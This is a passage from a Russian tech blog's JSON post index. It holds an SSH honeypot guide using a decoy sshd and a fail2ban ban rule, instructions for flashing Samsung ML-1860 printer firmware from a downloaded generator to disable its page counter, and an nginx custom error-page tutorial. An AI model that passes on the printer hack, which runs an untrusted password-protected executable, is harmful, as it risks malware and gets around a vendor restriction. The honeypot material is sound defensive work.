злоумышленников. (wikipedia.org)\n Одно из первых средств, которое применяется для аудита целевых систем - это сканирование портов с целью выявления, какие же службы (сервисы) там крутятся. Можете даже сейчас натравить nmap на свой сервер и посмотреть, что же он нам о нем расскажет. Самый простой пример результата его работы:\n$ nmap google.com Starting Nmap 6.47 ( http://nmap.org ) at 2050-01-11 00:00 GMT Nmap scan report for google.com (173.194.71.138) Host is up (0.010s latency). Other addresses for google.com (not scanned): 173.194.71.139 173.194.71.113 173.194.71.101 173.194.71.100 173.194.71.102 rDNS record for 173.194.71.138: lb-in-f138.1e100.net Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 4.92 seconds Из которого мы видим, что на целевой системе открыты 2 порта (стелс-сканирование и прочее мы пока опустим - не к чему оно сейчас): 80/tcp и 443/tcp и это означает, что там наверняка крутится web-сервер, который работает по http и https.\nТеперь подойдем к более интересному моменту.\nДовольно часто администраторы используют для доступа к своим серверам SSH. Стандартный порт для SSH - 22/tcp. Если администратор хоть чуть-чуть \u0026ldquo;шарит\u0026rdquo;, то после установки системы он сразу же перевешивает SSH на не стандартный порт (например 454545), запрещает логин от рута и настраивает авторизацию по сертификату вместо пароля. И оно совершенно правильно - держать SSH на стандартном порту, да без какой-либо дополнительной защиты - потенциально огромная брешь в безопасности.\nА что если повесить на этот самый 22 порт ещё один ssh-демон, но при этом все попытки логина по нему сразу отправлять в fail2ban? Обычным нашим пользователям SSH не нужен, мы ходим через порт 454545, значит тот, кто будет ломиться на 22 порт - бот или злоумышленник, которого необходимо забанить по IP на довольно длительное время. Обойти это ограничение можно будет лишь заюзав VPN, прокси или другое средство смены IP, ну или дождаться пока не пройдет время бана которое мы установим.\nДанную задачу будем решать в 3 этапа:\n Настроим и запустим дополнительный sshd-демон, который будет висеть на 22 порту; Настроим fail2ban, который будет читать логи на попытку коннекта по ssh на 22 порту; Поставим всё это дело в автозапуск;   Все манипуляции буду производить на CentOS 7, разница с другими дистрибутивами - минимальна\n Настройка и запуск дополнительного sshd-демона Считаем, что sshd у нас уже сейчас настроен и висит на отличном от 22 порту. Переходим в директорию с его конфигами и создаем новый конфиг для honeypot:\n$ cd /etc/ssh $ nano ./sshd_config_honeypot Пишем в него следующее (самые интересные моменты пометил желтым цветом):\nPort 22 AddressFamily inet SyslogFacility AUTH LogLevel VERBOSE PermitRootLogin no RSAAuthentication yes PubkeyAuthentication yes IgnoreRhosts yes RhostsRSAAuthentication no HostbasedAuthentication no IgnoreUserKnownHosts yes PermitEmptyPasswords no ChallengeResponseAuthentication no PasswordAuthentication no X11Forwarding no UsePAM yes UseDNS no AllowUsers nobody MaxAuthTries 1 MaxSessions 1 И после чего запускаем новый экземпляр sshd, но работающий именно с этим конфигом:\n$ /usr/sbin/sshd -f /etc/ssh/sshd_config_honeypot $ ps ax | grep sshd 803 ? Ss 0:00 /usr/sbin/sshd -D 2549 ? Ss 0:00 /usr/sbin/sshd -f /etc/ssh/sshd_config_honeypot 14627 ? Ss 0:00 sshd: root@pts/1 14804 pts/1 R+ 0:00 grep --color=auto sshd $ iptables -L -n | grep \u0026#39;:22\u0026#39; $  Для остановки демона можно выполнить (где 2549 это PID нашего процесса):\n $ kill 2549 Если демон у нас корректно запустился - в STDOUT/STDERR ничего критично не сказал, в процессах успешно завертелся, iptables у нас 22 порт не блокирует, пробуем подключиться к серваку с нашей машины:\n$ ssh -p 22 -l nobody 2.2.2.2 Permission denied (publickey). И тут де чекаем лог на сервере:\n$ tail -n40 /var/log/messages | grep sshd Jul 13 12:03:28 zero sshd[14869]: Connection from 1.1.1.1 port 1277 on 2.2.2.2 port 22 Jul 13 12:03:28 zero sshd[14869]: Connection closed by 1.1.1.1 [preauth] Если у тебя картина выгляди аналогично, значит всё работает как надо :) Попытки авторизации у нас обламываются, лог корректно пишется.\nНастройка fail2ban Переходим в директорию с fail2ban и первым делом создаем новый фильтр:\n$ cd /etc/fail2ban $ nano ./filter.d/sshd-honeypot.conf # Example: # Jul 13 09:18:28 zero sshd[8625]: Connection from 1.1.1.1 port 1218 on 2.2.2.2 port 22 [Definition] failregex = ^.+ sshd\\[\\d+\\]: (C|c)onnection from \u0026lt;HOST\u0026gt; port \\d+ on \\d+\\.\\d+\\.\\d+\\.\\d+ port 22$ ignoreregex = Сохраняем, проверяем работоспособность фильтра (важно, чтобы matched было не равно нулю, но и не было сильно больше количества наших попыток коннектов по ssh):\n$ fail2ban-regex /var/log/messages /etc/fail2ban/filter.d/sshd-honeypot.conf | grep matched Lines: 2001 lines, 0 ignored, 1 matched, 2000 missed [processed in 0.20 sec] После чего добавляем новый jail (/etc/fail2ban/jail.local):\n[ssh-honeypot] enabled = true filter = sshd-honeypot action = iptables-allports[name=\u0026#34;ssh_honeypot\u0026#34;, protocol=\u0026#34;all\u0026#34;] maxretry = 1 findtime = 10 # 86400 is 1 day, 259200 is 3 days bantime = 259200 logpath = /var/log/messages  Настоятельно рекомендую добавить свой IP адрес в ignoreip (секции [DEFAULT]), так как есть риск забанить себя на трое суток :) Формат записи следующий (использую 1.1.1.0/8 т.к. IP серый):\n[DEFAULT] ignoreip = 127.0.0.1/8 2.2.2.2 1.1.1.0/8 Или как минимум выставить bantime равным, например, 30 (секундам) - достаточно для того, чтобы проверить и при этом не получить массу неудобств.\n Перезапускаем fail2ban, проверяем лог:\n$ service fail2ban restart $ cat /var/log/fail2ban.log | grep \u0026#39; ERROR \u0026#39; Если лог у нас не содержит никаких критичных ошибок, то остается дело за малым - проверить, будет ли срабатывать правило. Cнова пытаемся приконнектиться к серверу с нашей машины:\n$ ssh -p 22 -l nobody 2.2.2.2 Смотрим на появление строки похожей на следующую в логе fail2ban:\n$ cat /var/log/fail2ban.log | grep ssh-honeypot 2050-01-11 01:00:00,000 fail2ban.filter [15038]: INFO [ssh-honeypot] Ignore 1.1.1.1 by ip Если так оно и есть - значит всё отлично работает - наш IP не был забанен только потому, что он находится в списке игнорируемых :)\nАвтозапуск В автозапуске нуждается лишь наш дополнительный демон sshd, т.к. fail2ban у тебя и так наверняка уже стартует вместе с системой.\nДобавим в файл /etc/rc.local следующую запись:\n## sshd honeypot autostart ssh_honeypot_config=\u0026#39;/etc/ssh/sshd_config_honeypot\u0026#39;; if [ -f $ssh_honeypot_config ] \u0026amp;\u0026amp; [ -x /usr/sbin/sshd ]; then /usr/sbin/sshd -f $ssh_honeypot_config; fi; Которая будет проверять наличие бинарника sshd и наличия нужного конфига. Если два этих условия выполняются, запускаем демона уже знакомым нам методом. Для верности можешь ребутнуть сервер и убедиться, что всё работает.\nТеперь пускай все желающие ломятся на наш SSH - результат для них будет лишь один :)\n","date":"2015-07-13T11:13:57Z","image":"https://blog.hook.sh/ssh-honeypot/cover_hu3201198c97328eef28a158f0c8170276_222779_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/ssh-honeypot/","title":"SSH Honeypot — просто и со вкусом"},{"content":"Где их использовать? Фоновые изображения страниц авторизации, ошибок, анимация. Врубай своё воображение ;) Осторожно - трафик!\n","date":"2015-05-18T15:45:35Z","permalink":"https://blog.hook.sh/little-gifs-collection-part1/","title":"Небольшая коллекция интересных гифок (часть 1)"},{"content":"В самом аппарате есть программное обеспечение (ПО), которое отвечает за все действия. При помощи этого ПО производится отсчет распечатанных страниц с чипа картриджа. Когда допустимое количество листов будет отпечатано, устройство блокируется. И заправкой картриджа, как вы понимаете здесь не обойтись.\nРешением сложившейся ситуации служит прошивка новым программным обеспечением ваш принтер. В обновленном ПО отсутствует счетчик страниц и уровень тонера всегда 100%.\nВ сети можно обнаружить великое множество ресурсов, на которых предлагают бесплатные и якобы рабочие прошивки. Может где-то оно и так, но тут публикую действительно рабочий способ и проверенный на себе способ.\n  Произведем печать отчета о конфигурации - вставляем в лоток 1 лист бумаги, зажимаем и удерживаем клавишу стоп (находится над кнопкой включения принтера) на 5..10 секунд - когда диод начинает медленно мигать зеленым цветом - отпускаем, после чего и распечатывается лист с отчетом. В отчете должны обнаружить версию прошивки v1.01.00.18 или v1.01.00.19. Если версия в отчете о конфигурации вашего принтера выше, то к сожалению этот способ не для вас;\n  Далее нужно скачать архив с генератором (ML1860GEN.zip, пароль на архив ML1860GEN) и извлечь из него файлы в удобное для вас место на компьютере. Данный офф-лайн генератор работает без подключения к сети интернет;\n  Приступаем к генерации файла прошивки для данного принтера. Для этого нужно найти в папке с распакованным архивом файл с именем ml-1860_19nu_gen.exe и делаем его запуск. В окне программа предложит вам ввести серийный номер;\n  Производим ввод серийного номера принтера, он как и версия прошивки находится в отчете о конфигурации. Состоит серийник из пятнадцати (15) знаков, например: Z5MBBKDB803345L, делаем запуск нажав на кнопку Generate. Далее вас проинформируют что генерация успешно завершилась - можно закрывать приложение. В папке, где расположен генератор, обнаружиться новый файл FIX_Z5MBBKDB803345L_ML1860_19NU.hd;\n  Мышью перетаскиваем полученный в предыдущем шаге файл (например, FIX_Z5MBBKDB803345L_ML1860_19NU.hd) на приложение usbprns2.exe. Затем откроется окно консоли Windows, которое по завершению процесса (3..10 секунд) закроется само. Принтер при этом немного пошумит механикой и произведет перезагрузку;\n  Выключаем принтер, достаем картридж, заклеиваем его контакты (например изолентой):\n   photo \n Вставляем картридж обратно, включаем принтер. Наблюдаем как диод теперь не мигает красным, а горит дружелюбным зеленым цветом :)  Так же распечатываем отчет (как в первом пункте). Проверяем чтоб после цифры версии появилась буква F (было V1.01.00.19 12-03-2010, стало V1.01.00.19F12-03-2010). Теперь для того чтоб картридж виделся как полный достаточно просто выключить и включить питание.\n","date":"2015-05-18T15:20:41Z","image":"https://blog.hook.sh/hack-printer-samsung-ml-1860/cover_hu20c3f0b842daba4ef0d24b51a21ac24b_26547_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/hack-printer-samsung-ml-1860/","title":"Прошивка принтера Samsung ML-1860"},{"content":"При работе с web-ресурсом возникают ошибки, и причина их может быть совершенно различна - от опечатки в URL, до ошибок самого сервера. И если у нас внешним сервером является nginx - мы можем довольно удобно указать свое содержание, которое будет выводиться при той или иной ситуации. Во-первых, это позволяет в какой-то мере замаскировать используемое ПО (т.к. определение по сигнатурам ответа становится невозможным); во-вторых - это визуальная кастомизация, которая положительно говорит о ресурсе в целом.\nУказание своих страниц ошибок Для того, чтоб nginx вместо встроенных шаблонов отдавал нужный нам контент - существует следующая конструкция (документация):\nerror_page 401 /401.html; error_page 404 /404.html; Которая нам говорит:\n В случае возникновения ошибки с кодом 401 вывести страницу 401.html, которая находится в корне веб-ресурса, и т.д.\n Страницы ошибок вне директории ресурса Отлично, но что нам делать, если хотим чтоб страницы ошибок лежали отдельно от корневой директории веб-сервера? Нам на помощь приходит location (документация):\nset $errordocs /some/path/to/nginx-errordocs; error_page 401 /401.html; location = /401.html { root $errordocs; } error_page 404 /404.html; location = /404.html { root $errordocs; } Которая говорит:\n Установим в переменную $errordocs значение /some/path/to/nginx-errordocs; в случае возникновения ошибки с кодом 401 вывести страницу 401.html, которая находится в корне веб-ресурса; при запросе страницы 401.html в корне веб-ресурса считать корнем веб-ресурса значение из $errordocs, и т.д. с описанными кодами ошибок\n Глобальные страницы ошибок А теперь ещё один момент - у нас может быть несколько хостов на одном сервере, и прописывать одни и те же настройки для каждого - дело не логичное. Тем более, что если произойдут какие-либо изменения - везде придется их обновлять.\nК сожалению, я не нашел способа сделать их глобальными для всех \u0026ldquo;по умолчанию\u0026rdquo;, но поступил следующим способом:\n Описываем все необходимые коды и страницы им соответствующие\n set $errordocs /some/path/to/nginx-errordocs; error_page 401 /401.html; location = /401.html { root $errordocs; } error_page 403 /403.html; location = /403.html { root $errordocs; } error_page 404 /404.html; location = /404.html { root $errordocs; } error_page 500 /500.html; location = /500.html { root $errordocs; } error_page 502 /502.html; location = /502.html { root $errordocs; } error_page 503 /503.html; location = /503.html { root $errordocs; } Сохраняем в файл /etc/nginx/errordocs_default.inc. Во всех хостах, в секции server {...} дописываем одну строчку (документация):\nserver { # ...  include /etc/nginx/errordocs_default.inc; # ... } Перезапускаем nginx, проверяем.\nПример страницы ошибки В качестве заготовки для содержимого страницы ошибки может быть следующий пример:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Error 404\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, maximum-scale=1\u0026#34; /\u0026gt; \u0026lt;link href=\u0026#34;//fonts.googleapis.com/css?family=Oxygen:400,800\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; html,body{margin:0;padding:0} body{overflow:hidden;text-align:center;background:#1a1a1a} .noselect{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none} *{color:#eee;font-weight:400;font-family:Tahoma,Arial,Verdana;-webkit-transition:all .3s;-moz-transition:all .3s;-o-transition:all .3s;cursor:default;-webkit-font-smoothing:antialiased!important} .screenCenter{position:absolute;height:300px;width:450px;top:50%;left:50%;margin:-150px 0 0 -225px} h1,h4{font-family:Oxygen,Tahoma,Verdana,Arial;width:100%;padding:0;margin:0;text-align:center} h4{font-size:20px;position:absolute;top:110px;background:#1a1a1a;padding:10px 0;z-index:10} h1{font-size:220px;font-weight:800;text-shadow:0 0 32px #fff;color:transparent;opacity:.7;z-index:1} .screenCenter:hover h1{font-size:220px;font-weight:800;text-shadow:0 3px 3px rgba(0,0,0,1);color:#fff;opacity:1!important} .screenCenter:hover h4{opacity:0!important} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;screenCenter noselect\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;File not found\u0026lt;/h4\u0026gt; \u0026lt;h1\u0026gt;404\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Превью примера:\n \nДля создания других страниц будет достаточно изменить в примере все вхождения 404 на необходимый код, и поправить описание ошибки между \u0026lt;h4\u0026gt;...\u0026lt;/h4\u0026gt;.\n","date":"2015-03-03T06:41:38Z","image":"https://blog.hook.sh/customize-nginx-error-pages/cover_hu6ae5f54eb95851fe70ad8a423f008f0a_46330_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/customize-nginx-error-pages/","title":"Настройка страниц ошибок для nginx"}]